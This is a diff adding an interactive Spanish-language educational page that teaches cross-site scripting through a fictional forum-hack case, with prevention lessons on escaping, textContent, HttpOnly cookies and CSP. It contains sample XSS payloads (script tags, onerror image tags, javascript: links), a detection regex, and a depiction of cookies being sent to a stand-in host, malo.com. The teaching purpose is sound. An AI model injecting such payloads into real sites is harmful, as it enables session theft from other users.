+      use("nocturno", 150, 100, 150) +
+      `<g transform="translate(46 140)" color="${AMBER}"><circle cx="38" cy="38" r="40" fill="${NAVY}"/><use href="#i-cookie" x="8" y="8" width="60" height="60"/></g>
+       <text x="84" y="240" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#5B6B86">sesion=ana_7f3c9e</text>` +
+      bubble(14, 42, 176, ["Sin contraseña.", "Ahora soy Ana."], 206, 122)),
+  ];
+
+  window.XSSA = { comic: () => panels.slice() };
+})();
+
+</script>
+
+<nav>
+  <div class="wrap">
+    <a class="brand" href="#inicio">XSS <span>ACADEMY</span></a>
+    <div class="links"><a href="index.html" style="background:rgba(25,211,197,0.18); border:1px solid var(--turq); color:var(--turq); font-weight:700;">🏠 Portal Central</a>
+      <a href="#caso">Caso</a><a href="#cap1">1 · Qué es</a><a href="#cap2">2 · Tipos</a><a href="#cap3">3 · Simulador</a>
+      <a href="#cap4">4 · Riesgos</a><a href="#cap5">5 · Prevención</a><a href="#mision">★ Misión</a><a href="#sala">Sala</a>
+    </div>
+  </div>
+  <div class="progress" id="progress"></div>
+</nav>
+
+<button class="fab" id="fab" title="Ver expediente"><svg class="ic"><use href="#i-folder"/></svg><span>Evidencias <span id="fabCount">0</span>/5</span></button>
+
+<!-- ================= INICIO ================= -->
+<section id="inicio">
+  <div class="wrap hero">
+    <div>
+      <div class="kicker">Revista educativa de ciberseguridad · Edición 01</div>
+      <h1>XSS<br><span>ACADEMY</span></h1>
+      <div style="font-family:'Space Grotesk';font-size:26px;color:#C9D6EA;margin-bottom:10px">El código oculto</div>
+      <p class="typed" id="typed"></p>
+      <p class="lead">Expediente 01: <b style="color:#fff">el ataque a ForoClase</b>. 37 cuentas comprometidas, ninguna contraseña robada y un sospechoso: <code style="color:var(--red)">n0cturno</code>. Reúne las evidencias y cierra el caso.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:20px">
+        <a class="btn" href="#caso">Abrir el expediente →</a>
+        <a class="btn ghost" href="#cap3">Probar el simulador</a>
+      </div>
+    </div>
+    <div class="hero-art">
+      <div class="browser">
+        <div class="bar"><span class="dot" style="background:#FF5C6C"></span><span class="dot" style="background:#FFB547"></span><span class="dot" style="background:#2BD48A"></span><span class="url">foroclase.edu/tarea-3</span></div>
+        <div class="body" id="heroBody"></div>
+      </div>
+      <svg class="villain" viewBox="0 0 120 120"><use href="#nocturno"/></svg>
+    </div>
+  </div>
+</section>
+
+<!-- ================= CASO ================= -->
+<section id="caso">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker" style="color:var(--amber)">Expediente 01 · Confidencial</div>
+      <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap"><h2 style="margin:0">El ataque a ForoClase</h2><span class="stamp" id="caseStamp">CASO ABIERTO</span></div>
+      <p class="lead" style="margin-top:16px"><b style="color:#fff">Lunes, 7:42 a. m.</b> 37 estudiantes descubrieron que sus cuentas habían publicado mensajes que nunca escribieron. Ana solo entró a leer los comentarios de la Tarea 3. Dani, el desarrollador, no encuentra contraseñas filtradas. El único rastro: <code style="color:var(--red)">n0cturno</code>.</p>
+    </div>
+    <div class="grid2 reveal" style="margin-top:24px">
+      <div class="card who"><div class="face"><svg viewBox="0 0 120 120"><use href="#ana"/></svg></div><div><b>Ana</b><span>Víctima. Abrió el foro y su cuenta empezó a publicar sola.</span></div></div>
+      <div class="card who"><div class="face"><svg viewBox="0 0 120 120"><use href="#dani"/></svg></div><div><b>Dani</b><span>Desarrollador de ForoClase. Programó los comentarios.</span></div></div>
+      <div class="card who"><div class="face dark"><svg viewBox="0 0 120 120"><use href="#nocturno"/></svg></div><div><b>n0cturno</b><span>Sospechoso. Cuenta creada el domingo a las 2:05 a. m.</span></div></div>
+      <div class="card who"><div class="face dark"><svg viewBox="0 0 120 120"><use href="#servidor"/></svg></div><div><b>ForoClase</b><span>Escena del ataque. Guarda tareas, comentarios y sesiones.</span></div></div>
+    </div>
+    <h3 class="reveal" style="margin-top:30px"><svg class="ic" style="color:var(--amber)"><use href="#i-folder"/></svg>Registro de evidencias</h3>
+    <p class="reveal" style="color:var(--muted);margin-top:-6px">Hay una evidencia al final de cada capítulo. Se guardan aquí automáticamente cuando las encuentras.</p>
+    <div class="tracker reveal" id="tracker"></div>
+  </div>
+</section>
+
+<!-- ================= CAP 1 ================= -->
+<section id="cap1">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker">Capítulo</div><div class="num">01</div>
+      <h2>¿Qué es XSS?</h2>
+      <p class="lead"><b style="color:var(--turq)">Cross-Site Scripting</b> es una vulnerabilidad que permite insertar código JavaScript en una página que otras personas visitan. El navegador no distingue: si el sitio le entrega código, lo ejecuta.</p>
+    </div>
+    <div class="card reveal" style="margin-top:28px">
+      <h3><svg class="ic"><use href="#i-search"/></svg>Mira con los ojos del navegador</h3>
+      <p style="color:var(--muted);margin-top:-4px">Escribe un comentario. Te mostramos qué partes vería el navegador como <span class="tok-text" style="background:#081324;padding:0 4px;border-radius:4px">texto</span>, como <span class="tok-tag">etiqueta</span> o como <span class="tok-attr">atributo peligroso</span> si el sitio fuera vulnerable.</p>
+      <textarea id="c1in" rows="2">Hola <b>clase</b> <script>alert('hackeado')</script></textarea>
+      <div class="chips">
+        <span class="chip" data-c1="¡Excelente explicación, profe!">texto normal</span>
+        <span class="chip" data-c1="Me gusta <b>mucho</b>">negrita</span>
+        <span class="chip" data-c1="<script>alert('hackeado')</script>">script</span>
+        <span class="chip" data-c1="<img src=x onerror=alert(1)>">imagen trampa</span>
+        <span class="chip" data-c1="<a href=&quot;javascript:robar()&quot;>premio</a>">enlace falso</span>
+      </div>
+      <div class="parse-out" id="c1out"></div>
+      <div id="c1verdict"></div>
+    </div>
+    <div class="grid3 reveal" style="margin-top:20px">
+      <div class="card"><h3><svg class="ic"><use href="#i-cookie"/></svg>Cookies</h3><p style="margin:0">Guardan tu sesión iniciada. Si un script las roba, el atacante entra como tú.</p></div>
+      <div class="card"><h3><svg class="ic"><use href="#i-lock"/></svg>Same-Origin</h3><p style="margin:0">El navegador aísla cada sitio. XSS la esquiva porque el código parece venir del sitio legítimo.</p></div>
+      <div class="card"><h3><svg class="ic"><use href="#i-clip"/></svg>OWASP</h3><p style="margin:0">XSS forma parte de la categoría «A03: Inyección» del OWASP Top 10:2021.</p></div>
+    </div>
+    <div class="pista" data-ev="A"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA A<span class="got">✓ en el expediente</span></div><p>Captura del foro: el comentario de <b>n0cturno</b> se ve vacío, pero el código fuente muestra un <code>&lt;script&gt;</code>. El foro trató un dato como código.</p></div>
+  </div>
+</section>
+
+<!-- ================= CAP 2 ================= -->
+<section id="cap2">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker">Capítulo</div><div class="num">02</div>
+      <h2>Tipos de XSS</h2>
+      <p class="lead">Elige un tipo, pulsa <b>Empezar</b> y avanza con <b>Siguiente paso</b> para ver cómo viaja el código malicioso.</p>
+    </div>
+    <div class="reveal" style="margin-top:24px">
+      <div class="tabs">
+        <button class="tab on" data-type="reflejado"><svg class="ic"><use href="#i-loop"/></svg>Reflejado</button>
+        <button class="tab" data-type="almacenado"><svg class="ic"><use href="#i-db"/></svg>Almacenado</button>
+        <button class="tab" data-type="dom"><svg class="ic"><use href="#i-code"/></svg>Basado en DOM</button>
+      </div>
+      <div class="stage" id="stage">
+        <div class="db" id="stageDb"></div>
+        <div class="actor" style="left:3%"><svg viewBox="0 0 120 120"><use href="#nocturno"/></svg>n0cturno</div>
+        <div class="actor" style="left:calc(50% - 55px)" id="midActor"></div>
+        <div class="actor" style="right:3%"><svg viewBox="0 0 120 120"><use href="#ana"/></svg>Ana</div>
+        <div class="packet" id="packet"></div>
+        <div class="stage-cap" id="stageCap"></div>
+      </div>
+      <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap;align-items:center">
+        <button class="btn ghost" id="prevStep">◀ Anterior</button>
+        <button class="btn" id="nextStep">Siguiente paso ▶</button>
+        <button class="btn ghost" id="resetStep">↺ Reiniciar</button>
+        <span id="stepCount" class="mono" style="color:var(--amber);font-size:13px"></span>
+      </div>
+      <p id="typeDesc" style="color:var(--muted);margin:10px 0 0"></p>
+    </div>
+    <div class="grid3 reveal" style="margin-top:24px">
+      <div class="card"><h3 style="color:var(--amber)"><svg class="ic" style="color:var(--amber)"><use href="#i-loop"/></svg>Reflejado</h3><p style="margin:0">Llega en un enlace trampa. Afecta a quien hace clic. Ej.: un buscador que repite lo buscado.</p></div>
+      <div class="card"><h3 style="color:var(--red)"><svg class="ic" style="color:var(--red)"><use href="#i-db"/></svg>Almacenado</h3><p style="margin:0">Se guarda en la base de datos y ataca a todos los visitantes. El más peligroso.</p></div>
+      <div class="card"><h3><svg class="ic"><use href="#i-code"/></svg>DOM</h3><p style="margin:0">El JavaScript del propio sitio inserta el dato en la página, sin pasar por el servidor.</p></div>
+    </div>
+    <div class="pista" data-ev="B"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA B<span class="got">✓ en el expediente</span></div><p>Las 37 víctimas solo abrieron la página de la <b>Tarea 3</b>. Ninguna hizo clic en un enlace extraño. ¿Qué tipo de XSS deja el código guardado esperando?</p></div>
+  </div>
+</section>
+
+<!-- ================= CAP 3 ================= -->
+<section id="cap3">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker">Capítulo</div><div class="num">03</div>
+      <h2>¿Cómo ocurre?</h2>
+    </div>
+    <div class="comic reveal" id="comic" style="margin-top:24px"></div>
+
+    <h3 class="reveal" style="margin-top:40px"><svg class="ic"><use href="#i-alert"/></svg>Simulador seguro</h3>
+    <div class="note warn reveal"><b>Laboratorio seguro:</b> nada de lo que escribas se ejecuta de verdad. Los comentarios se muestran en un marco aislado sin permiso para ejecutar scripts; la «ventana emergente» y el «robo de cookie» son simulaciones de lo que pasaría en un sitio real.</div>
+    <div class="sim reveal">
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px">
+          <h3 style="margin:0">Laboratorio de ataque</h3>
+          <div class="toggle"><button class="v on" id="modeV">Vulnerable</button><button class="p" id="modeP">Protegido</button></div>
+        </div>
+        <div class="tabs" style="margin-bottom:10px">
+          <button class="tab on" data-vec="stored"><svg class="ic"><use href="#i-db"/></svg>Almacenado</button>
+          <button class="tab" data-vec="reflected"><svg class="ic"><use href="#i-loop"/></svg>Reflejado</button>
+          <button class="tab" data-vec="dom"><svg class="ic"><use href="#i-code"/></svg>DOM</button>
+        </div>
+        <p class="vec-help" id="vecHelp"></p>
+        <div class="urlbar" id="urlPrefix" hidden></div>
+        <textarea id="simIn" rows="3" aria-label="Entrada del atacante"></textarea>
+        <div class="chips" id="simChips"></div>
+        <div style="display:flex;gap:10px;flex-wrap:wrap"><button class="btn" id="simPost"></button><button class="btn ghost" id="simReset">↺ Reiniciar</button></div>
+        <h3 style="margin-top:18px;font-size:16px">Registro del navegador de Ana</h3>
+        <div class="log" id="simLog"></div>
+      </div>
+      <div>
+        <div class="browser">
+          <div class="bar"><span class="dot" style="background:#FF5C6C"></span><span class="dot" style="background:#FFB547"></span><span class="dot" style="background:#2BD48A"></span><span class="url" id="simUrl"></span></div>
+          <div class="forum" id="forum"></div>
+        </div>
+        <div class="viewer"><div class="face"><svg viewBox="0 0 120 120"><use href="#ana"/></svg></div><span>Navegador de <b style="color:#fff">Ana</b>, con sesión iniciada.</span></div>
+        <div class="browser attacker">
+          <div class="bar"><span class="dot" style="background:#FF5C6C"></span><span class="dot" style="background:#FFB547"></span><span class="dot" style="background:#2BD48A"></span><span class="url" id="atkUrl"></span></div>
+          <div class="atk-body" id="atk"></div>
+        </div>
+        <div class="viewer"><div class="face dark"><svg viewBox="0 0 120 120"><use href="#nocturno"/></svg></div><span>Navegador de <b style="color:#fff">n0cturno</b>: su servidor recibe lo que el script envía.</span></div>
+      </div>
+    </div>
+    <div class="pista" data-ev="C"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA C<span class="got">✓ en el expediente</span></div><p>Registro del servidor: <b>37 peticiones</b> a <code>malo.com/?c=sesion=…</code>, cada una segundos después de que alguien abriera la Tarea 3. ¿Qué se llevó n0cturno?</p></div>
+  </div>
+</section>
+
+<!-- ================= CAP 4 ================= -->
+<section id="cap4">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker">Capítulo</div><div class="num">04</div>
+      <h2>Riesgos — Historia interactiva</h2>
+      <p class="lead">Retrocede una semana. Eres <b>Dani</b>, y tus decisiones protegen, o exponen, a cientos de estudiantes.</p>
+    </div>
+    <div class="card story reveal" style="margin-top:24px">
+      <div class="meter"><span>Seguridad</span><div class="barbg"><div class="fill" id="meter"></div></div><span id="meterTxt">50%</span></div>
+      <div id="story"></div>
+    </div>
+    <div class="grid3 reveal" style="margin-top:24px">
+      <div class="card"><span class="mono" style="color:var(--amber);font-size:12px">2005 · MYSPACE</span><h3><svg class="ic"><use href="#i-worm"/></svg>Gusano Samy</h3><p style="margin:0">Un código en un perfil se copió solo a más de un millón de perfiles en unas 20 horas.</p></div>
+      <div class="card"><span class="mono" style="color:var(--amber);font-size:12px">2014 · TWEETDECK</span><h3><svg class="ic"><use href="#i-loop"/></svg>Tuit autorretuiteable</h3><p style="margin:0">Un tuit con código se compartía solo al ser visto; el servicio se desactivó temporalmente.</p></div>
+      <div class="card"><span class="mono" style="color:var(--amber);font-size:12px">2019 · FORTNITE</span><h3><svg class="ic"><use href="#i-alert"/></svg>Página olvidada</h3><p style="margin:0">Un XSS en una página antigua de Epic Games podía ayudar a tomar cuentas de jugadores.</p></div>
+    </div>
+    <div class="pista" data-ev="D"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA D<span class="got">✓ en el expediente</span></div><p>Las cuentas robadas publicaron el mismo «¡Gran tarea!» en otros temas del foro, y así se sumaron más víctimas. ¿A cuál caso real se parece?</p></div>
+  </div>
+</section>
+
+<!-- ================= CAP 5 ================= -->
+<section id="cap5">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker">Capítulo</div><div class="num">05</div>
+      <h2>Prevención — Código lado a lado</h2>
+      <p class="lead">Escribe una entrada y mira cómo la trata cada versión del código.</p>
+    </div>
+    <div class="card reveal" style="margin-top:24px">
+      <input type="text" id="c5in" value="<img src=x onerror=alert(1)> Hola">
+      <div class="cmp" style="margin-top:16px">
+        <div>
+          <span class="tagbad">INSEGURO</span>
+          <pre class="code bad">caja.<span class="k">innerHTML</span> = comentario;</pre>
+          <div class="render" id="c5bad"></div>
+          <div id="c5badV" style="font-size:14px;margin-top:8px"></div>
+        </div>
+        <div>
+          <span class="taggood">SEGURO</span>
+          <pre class="code good">caja.<span class="k">textContent</span> = comentario;</pre>
+          <div class="render" id="c5good"></div>
+          <div style="font-size:14px;margin-top:8px;color:var(--green)">✓ Se muestra como texto. Nada se ejecuta.</div>
+        </div>
+      </div>
+      <h3 style="margin-top:22px;font-size:16px">Lo que realmente se envía al HTML después de escapar:</h3>
+      <pre class="code good" id="c5esc"></pre>
+      <p style="color:var(--muted);font-size:14px;margin:0">Esas secuencias se llaman <b style="color:#fff">entidades</b>. También existen numéricas: <code>&amp;#65;</code> es la letra A. Te servirá en la Sala de Evidencias…</p>
+    </div>
+
+    <h3 class="reveal" style="margin-top:30px"><svg class="ic"><use href="#i-shield"/></svg>Las cinco capas de defensa <span style="color:var(--muted);font-size:14px;font-weight:400">(toca cada una)</span></h3>
+    <div class="layers reveal">
+      <div class="card layer"><div class="n">1</div><div><b>Validar la entrada</b><div class="d">Si un campo espera una edad, acepta solo números. Reduce riesgos, pero no reemplaza el escape.</div></div></div>
+      <div class="card layer"><div class="n">2</div><div><b>Escapar la salida</b><div class="d">Convierte <code>&lt; &gt; &amp; " '</code> en entidades. En PHP: <code>htmlspecialchars($x, ENT_QUOTES, 'UTF-8')</code>.</div></div></div>
+      <div class="card layer"><div class="n">3</div><div><b>Usar APIs seguras</b><div class="d"><code>textContent</code> en vez de <code>innerHTML</code>. Cuidado con <code>dangerouslySetInnerHTML</code> (React) y <code>v-html</code> (Vue). Si necesitas HTML, sanitiza con DOMPurify.</div></div></div>
+      <div class="card layer"><div class="n">4</div><div><b>Cookies HttpOnly</b><div class="d"><code>Set-Cookie: sesion=abc; HttpOnly; Secure; SameSite=Lax</code> — JavaScript ya no puede leerla.</div></div></div>
+      <div class="card layer"><div class="n">5</div><div><b>Content Security Policy</b><div class="d"><code>Content-Security-Policy: script-src 'self'</code> — el navegador bloquea scripts inyectados en la página.</div></div></div>
+    </div>
+    <div class="pista" data-ev="E"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA E<span class="got">✓ en el expediente</span></div><p>Código de ForoClase, línea 42: <code style="color:var(--red);font-weight:700">lista.innerHTML += c.texto;</code> ¿Qué debió escribir Dani en su lugar?</p></div>
+  </div>
+</section>
+
+<!-- ================= MISIÓN ================= -->
+<section id="mision">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker" style="color:var(--amber)">★ Misión XSS</div>
+      <h2>Revisa el resto de ForoClase</h2>
+      <p class="lead">Dani te pide auditar otras partes del foro antes de reabrirlo. Cada desafío se corrige al instante.</p>
+    </div>
+    <div class="card reveal" style="margin-top:20px">
+      <h3>Desafío 1 · ¿Vulnerable o seguro?</h3>
+      <div id="m1"></div>
+    </div>
+    <div class="card reveal" style="margin-top:16px">
+      <h3>Desafío 2 · Escapa a mano</h3>
+      <p>Escribe la versión escapada de: <code>&lt;b onclick="x()"&gt;Hola&lt;/b&gt;</code></p>
+      <input type="text" id="m2in" placeholder="&amp;lt;b ...">
+      <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap"><button class="btn" id="m2btn">Verificar</button><button class="btn ghost" id="m2hint">Pista</button></div>
+      <div class="fb" id="m2fb"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= SALA DE EVIDENCIAS ================= -->
+<section id="sala">
+  <div class="wrap">
+    <div class="reveal">
+      <div class="kicker" style="color:var(--amber)">Expediente 01 · Evidencia final</div>
+      <h2>Sala de Evidencias</h2>
+      <p class="lead">Dani guardó la clave de esta sala escrita como entidades HTML. Si tienes la revista impresa, la encontrarás en la página «El código oculto». Si no, descífrala aquí.</p>
+    </div>
+    <div class="card reveal" style="margin-top:20px">
+      <div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap">
+        <div class="face" style="width:60px;height:60px"><svg viewBox="0 0 120 120"><use href="#dani"/></svg></div>
+        <div class="cipher" id="cipher"></div>
+      </div>
+      <button class="btn ghost" id="asciiBtn" style="margin-top:4px">Mostrar tabla de entidades</button>
+      <div class="ascii" id="ascii" hidden></div>
+      <div class="vault" style="margin-top:16px">
+        <input type="text" id="vaultIn" maxlength="12" placeholder="CLAVE" autocomplete="off" aria-label="Clave de la sala">
+        <button class="btn amber" id="vaultBtn"><svg class="ic" style="color:var(--navy);vertical-align:-5px"><use href="#i-key"/></svg> Abrir</button>
+      </div>
+      <div class="fb" id="vaultFb"></div>
+    </div>
+
+    <div class="card locked" id="closeCase" style="margin-top:16px">
+      <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap">
+        <h3 style="margin:0"><svg class="ic" style="color:var(--amber)"><use href="#i-folder"/></svg>Informe final para Dani</h3>
+        <span style="color:var(--muted);font-size:14px">Usa tus evidencias: <span id="evSummary"></span></span>
+      </div>
+      <div style="margin-top:16px" id="caseForm"></div>
+      <button class="btn amber" id="caseBtn">Cerrar el caso</button>
+      <div id="caseResult" style="margin-top:14px"></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <p><b style="color:#fff">XSS Academy · El código oculto</b> — Edición 01. Versión digital complementaria de la revista impresa.</p>
+    <p>Fuentes: OWASP XSS Prevention Cheat Sheet · OWASP Top 10:2021 · MDN Web Docs · PortSwigger Web Security Academy.</p>
+    <p style="font-size:12px">ForoClase, Ana, Dani y n0cturno son personajes ficticios. Probar ataques en sitios sin autorización es ilegal.</p>
+  </div>
+</footer>
+
+<script>
+const $ = s => document.querySelector(s);
+const $$ = s => [...document.querySelectorAll(s)];
+const esc = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
+const DANGER = /<\s*script|on[a-z]+\s*=|javascript\s*:|<\s*iframe/i;
+const icon = (id, style = '') => `<svg class="ic" style="${style}"><use href="#${id}"/></svg>`;
+const store = {
+  get(k){ try { return JSON.parse(localStorage.getItem('xssa-' + k)); } catch { return null; } },
+  set(k, v){ try { localStorage.setItem('xssa-' + k, JSON.stringify(v)); } catch {} },
+};
+
+/* ---------- navegación ---------- */
+const sections = $$('section');
+const navLinks = $$('nav .links a');
+addEventListener('scroll', () => {
+  const h = document.documentElement;
+  $('#progress').style.width = (h.scrollTop / (h.scrollHeight - h.clientHeight) * 100) + '%';
+  let cur = '';
+  sections.forEach(s => { if (s.getBoundingClientRect().top < 140) cur = s.id; });
+  navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + cur));
+}, { passive:true });
+const io = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } }), { threshold:.12 });
+$$('.reveal').forEach(el => io.observe(el));
+
+/* ---------- hero ---------- */
+const phrases = ["los datos del usuario son texto…", "…nunca código.", "¿quién es n0cturno?"];
+let pi = 0, ci = 0, del = false;
+(function type(){
+  const p = phrases[pi]; $('#typed').textContent = p.slice(0, ci);
+  if (!del && ci < p.length) ci++; else if (!del) { del = true; return setTimeout(type, 1500); }
+  else if (ci > 0) ci--; else { del = false; pi = (pi + 1) % phrases.length; }
+  setTimeout(type, del ? 30 : 70);
+})();
+(function heroLoop(){
+  const lines = [
+    ['<span style="color:#8FA3C2">// ForoClase · Tarea 3 · comentarios</span>', 0],
+    ['<b style="color:#fff">ana:</b> ¡Buena explicación!', 500],
+    ['<b style="color:#fff">leo:</b> Gracias profe', 1100],
+    ['<b style="color:#fff">n0cturno:</b> ¡Gran tarea! <span style="color:#FF5C6C">&lt;script&gt;robar()&lt;/script&gt;</span>', 1900],
+    ['<span style="color:#FFB547">⚠ el navegador ejecuta el script…</span>', 3000],
+    ['<span style="color:#FF5C6C">→ cookie de ana enviada a malo.com</span>', 3800],
+  ];
+  const body = $('#heroBody'); body.innerHTML = '';
+  lines.forEach(([html, t]) => setTimeout(() => { const d = document.createElement('div'); d.className = 'line'; d.innerHTML = html; body.appendChild(d); }, t));
+  setTimeout(heroLoop, 7500);
+})();
+
+/* ---------- expediente / evidencias ---------- */
+const EVIDENCE = {
+  A: ['Capítulo 1', 'El foro trató un dato como código: había un <script> oculto.'],
+  B: ['Capítulo 2', 'Solo abrir la Tarea 3 bastaba: el código estaba guardado.'],
+  C: ['Capítulo 3', '37 peticiones a malo.com con la cookie de sesión.'],
+  D: ['Capítulo 4', 'Las cuentas robadas repetían el comentario: como un gusano.'],
+  E: ['Capítulo 5', 'Línea 42: lista.innerHTML += c.texto;'],
+};
+const found = new Set(store.get('ev') || []);
+function renderTracker(){
+  $('#tracker').innerHTML = '';
+  Object.entries(EVIDENCE).forEach(([k, [where, txt]]) => {
+    const d = document.createElement('div'); d.className = 'slot' + (found.has(k) ? ' found' : '');
+    const b = document.createElement('b'); b.textContent = k; d.appendChild(b);
+    const s = document.createElement('span'); s.textContent = found.has(k) ? txt : where + ' · sin descubrir'; d.appendChild(s);
+    $('#tracker').appendChild(d);
+  });
+  $('#fabCount').textContent = found.size;
+  $$('.pista').forEach(p => p.classList.toggle('found', found.has(p.dataset.ev)));
+  $('#evSummary').textContent = found.size + ' de 5 reunidas';
+}
+function checkPistas(){
+  $$('.pista').forEach(p => {
+    const k = p.dataset.ev, r = p.getBoundingClientRect();
+    if (found.has(k) || r.top > innerHeight * .85 || r.bottom < innerHeight * .15) return;
+    found.add(k); store.set('ev', [...found]); renderTracker();
+    const f = $('#fab'); f.classList.remove('bump'); void f.offsetWidth; f.classList.add('bump');
+  });
+}
+addEventListener('scroll', checkPistas, { passive:true });
+$('#fab').onclick = () => $('#caso').scrollIntoView({ behavior:'smooth' });
+renderTracker();
+
+/* ---------- cap 1: tokenizador didáctico ---------- */
+function tokenize(str){
+  let out = '', i = 0;
+  const re = /<\/?[a-zA-Z][^>]*>?/g; let m;
+  while ((m = re.exec(str))) {
+    out += `<span class="tok-text">${esc(str.slice(i, m.index))}</span>`;
+    const tag = esc(m[0]).replace(/(on[a-z]+\s*=|javascript\s*:)/gi, '</span><span class="tok-attr">$1</span><span class="tok-tag">');
+    out += `<span class="tok-tag">${tag}</span>`;
+    i = m.index + m[0].length;
+  }
+  return out + `<span class="tok-text">${esc(str.slice(i))}</span>`;
+}
+function c1(){
+  const v = $('#c1in').value;
+  $('#c1out').innerHTML = tokenize(v) || '&nbsp;';
+  const hasTag = /<\/?[a-zA-Z]/.test(v);
+  $('#c1verdict').innerHTML = DANGER.test(v)
+    ? '<div class="verdict ko">⚠ Contiene código ejecutable. En un sitio vulnerable, el navegador lo ejecutaría para cada visitante.</div>'
+    : hasTag ? '<div class="verdict ko" style="color:var(--amber);background:rgba(255,181,71,.12)">◐ Contiene HTML. No ejecuta código, pero demuestra que el sitio interpreta etiquetas: la puerta está abierta.</div>'
+             : '<div class="verdict ok">✓ Solo texto. El navegador lo mostrará tal cual.</div>';
+}
+$('#c1in').addEventListener('input', c1);
+$$('[data-c1]').forEach(ch => ch.onclick = () => { $('#c1in').value = ch.dataset.c1; c1(); });
+c1();
+
+/* ---------- cap 2: animación de tipos ---------- */
+const actorSvg = (id, name) => `<svg viewBox="0 0 120 120"><use href="#${id}"/></svg>${name}`;
+const TYPES = {
+  reflejado: { mid:['servidor','Servidor'], desc:'El código viaja en la URL y rebota en la respuesta.', steps:[
+    { from:8, to:88, label:'enlace?q=<script>', cap:'1. n0cturno envía un enlace trampa a Ana.' },
+    { from:88, to:50, label:'clic → ?q=<script>', cap:'2. Ana hace clic: su navegador pide la página con el código en la URL.' },
+    { from:50, to:88, label:'"Resultados para <script>"', cap:'3. El servidor «refleja» el texto en la respuesta sin escaparlo.' },
+    { from:88, to:88, label:'se ejecuta', boom:true, cap:'4. El navegador de Ana ejecuta el script. Solo afecta a quien hizo clic.' } ] },
+  almacenado: { mid:['servidor','Servidor + BD'], desc:'El código se guarda y ataca a todos los visitantes.', steps:[
+    { from:8, to:50, label:'comentario + <script>', cap:'1. n0cturno publica un comentario con código oculto.' },
+    { from:50, to:50, label:'guardado', cap:'2. El servidor lo guarda en la base de datos sin revisar.', db:'BD: [comentario #37 con <script>]' },
+    { from:50, to:88, label:'página + <script>', cap:'3. Cada visitante —Ana incluida— recibe la página con el comentario.' },
+    { from:88, to:88, label:'se ejecuta', boom:true, cap:'4. El script corre en el navegador de TODOS los visitantes. ¿Te suena?' } ] },
+  dom: { mid:['servidor','JS del sitio'], desc:'El servidor nunca ve el código: lo inserta el JavaScript del sitio.', steps:[
+    { from:8, to:88, label:'sitio.com/#<img onerror>', cap:'1. n0cturno comparte un enlace con código después de «#».' },
+    { from:88, to:50, label:'location.hash', cap:'2. El JavaScript del propio sitio lee el fragmento de la URL…' },
+    { from:50, to:88, label:'innerHTML = hash', cap:'3. …y lo inserta en la página con innerHTML.' },
+    { from:88, to:88, label:'se ejecuta', boom:true, cap:'4. El navegador ejecuta el código. El servidor nunca lo vio.' } ] },
+};
+/* Avance paso a paso: quien expone decide cuándo continuar. */
+let curType = 'reflejado', playing = false, stepIdx = -1;
+function updateStepUi(){
+  const n = TYPES[curType].steps.length;
+  $('#stepCount').textContent = stepIdx < 0 ? `${n} pasos` : `Paso ${stepIdx + 1} de ${n}`;
+  $('#prevStep').disabled = stepIdx <= 0;
+  $('#prevStep').style.opacity = stepIdx <= 0 ? .4 : 1;
+  $('#nextStep').textContent = stepIdx < 0 ? '▶ Empezar' : stepIdx >= n - 1 ? '↺ Volver a empezar' : 'Siguiente paso ▶';
+}
+function setType(t){
+  curType = t; stepIdx = -1; const T = TYPES[t];
+  $$('[data-type]').forEach(b => b.classList.toggle('on', b.dataset.type === t));
+  $('#midActor').innerHTML = actorSvg(...T.mid);
+  $('#typeDesc').textContent = T.desc; $('#stageDb').textContent = ''; $('#stageCap').textContent = 'Pulsa «Empezar» y avanza un paso cada vez que termines de explicarlo.';
+  const pk = $('#packet'); pk.getAnimations().forEach(a => a.cancel()); pk.style.opacity = 0;
+  updateStepUi();
+}
+async function showStep(i, animate){
+  const steps = TYPES[curType].steps, s = steps[i], pk = $('#packet'), stage = $('#stage');
+  stepIdx = i; updateStepUi();
+  pk.textContent = s.label; $('#stageCap').textContent = s.cap;
+  $('#stageDb').textContent = (steps.slice(0, i + 1).filter(x => x.db).pop() || {}).db || '';
+  const x = p => Math.max(5, Math.min(stage.clientWidth - pk.offsetWidth - 5, stage.clientWidth * p / 100 - pk.offsetWidth / 2));
+  pk.style.opacity = 1;
+  pk.style.background = s.boom ? 'var(--red)' : 'var(--navy3)';
+  pk.style.border = '1px solid var(--red)';
+  pk.getAnimations().forEach(a => a.cancel());
+  const frames = [{ left: x(animate ? s.from : s.to) + 'px' }, { left: x(s.to) + 'px' }];
+  playing = true;
+  const dur = animate ? 1600 : 1;
+  const anim = pk.animate(frames, { duration: dur, easing: 'ease-in-out', fill: 'forwards' });
+  // Límite de seguridad: si el navegador pausa la animación, el botón no queda bloqueado.
+  await Promise.race([anim.finished.catch(() => {}), new Promise(r => setTimeout(r, dur + 150))]);
+  anim.finish();
+  playing = false;
+}
